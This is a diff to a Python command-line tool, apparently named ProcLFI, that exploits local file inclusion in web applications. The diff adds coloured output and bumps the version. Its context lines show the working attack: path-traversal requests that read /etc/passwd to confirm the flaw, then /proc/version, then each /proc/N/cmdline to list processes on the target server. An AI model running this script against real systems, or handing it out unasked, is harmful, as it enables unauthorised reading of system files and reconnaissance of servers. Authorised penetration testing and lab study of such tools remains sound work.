@@ -1,6 +1,9 @@
 #!/usr/bin/env python3
 import requests
 import argparse
+from colorama import init, Fore, Back, Style
+
+init()
 
 def print_banner():
     banner = r"""      _____                _       _____ 
@@ -9,7 +12,7 @@ def print_banner():
      |  ___/ '__/ _ \ / __| |     \___ \ 
      | |   | | | (_) | (__| |____ ____) |
      |_|   |_|  \___/ \___|______|_____/"""
-    version = "1.0.2"
+    version = "1.1.0"
     credit = f"{' ' * 34}By Abgache\n{' ' * 34}Version: {version}\n"
     print(banner)
     print(credit)
@@ -40,20 +43,20 @@ def main():
         "warning",
     ]
 
-    print(f"[*] Target: {base}")
+    print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Target: {base}")
 
     test_url = f"{base}/{args.path}?{args.param}=../../../../etc/passwd"
     test = requests.get(test_url, timeout=3)
 
     if "root:x:" not in test.text:
-        print("[-] LFI not confirmed (or filtered)")
+        print(f"{Fore.RED}[-]{Style.RESET_ALL} LFI not confirmed (or filtered)")
         return
     else:
-        print("[+] LFI confirmed")
+        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} LFI confirmed")
 
     ver_url = f"{base}/{args.path}?{args.param}=../../../../proc/version"
     ver = requests.get(ver_url, timeout=3)
-    print(f"[*] OS Version: {ver.text.strip()}\n")
+    print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} OS Version: {ver.text.strip()}\n")
 
     for i in range(1, args.max + 1):
         url = f"{base}/{args.path}?{args.param}=../../../../proc/{i}/cmdline"
@@ -63,9 +66,9 @@ def main():
 
             content = r.text.strip().lower()
             if r.ok and r.text.strip() and content and not any(b in content for b in bad_keywords):
-                print(f"\r[+] /proc/{i}/cmdline -> {r.text[:200]}")
+                print(f"\r{Fore.GREEN}[+]{Style.RESET_ALL} /proc/{i}/cmdline -> {r.text[:200]}")
             else:
-                print(f"\r[-] /proc/{i}/cmdline -> No data", end="")
+                print(f"\r{Fore.RED}[-]{Style.RESET_ALL} /proc/{i}/cmdline -> No data", end="")
 
         except requests.RequestException:
             continue
